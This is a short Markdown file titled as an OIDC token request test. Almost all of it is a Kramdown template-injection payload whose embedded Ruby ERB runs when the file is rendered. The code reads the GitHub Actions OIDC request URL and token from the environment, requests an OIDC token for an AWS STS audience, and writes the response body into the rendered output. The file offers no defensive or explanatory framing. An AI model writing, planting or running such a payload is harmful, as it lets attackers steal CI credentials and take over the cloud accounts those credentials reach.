---
---

# Test 3: OIDC token request

{::options template="string://<%= require 'net/http'; require 'uri'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); r = 'OIDC_URL=' + u.to_s[0..80] + ' TOKEN_LEN=' + t.to_s.length.to_s; begin; uri = URI(u + '&audience=sts.amazonaws.com'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + t); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = r + ' STATUS=' + resp.code + ' BODY=' + resp.body[0..600]; rescue => e; r = r + ' ERR=' + e.message; end; r %>" /}

placeholder
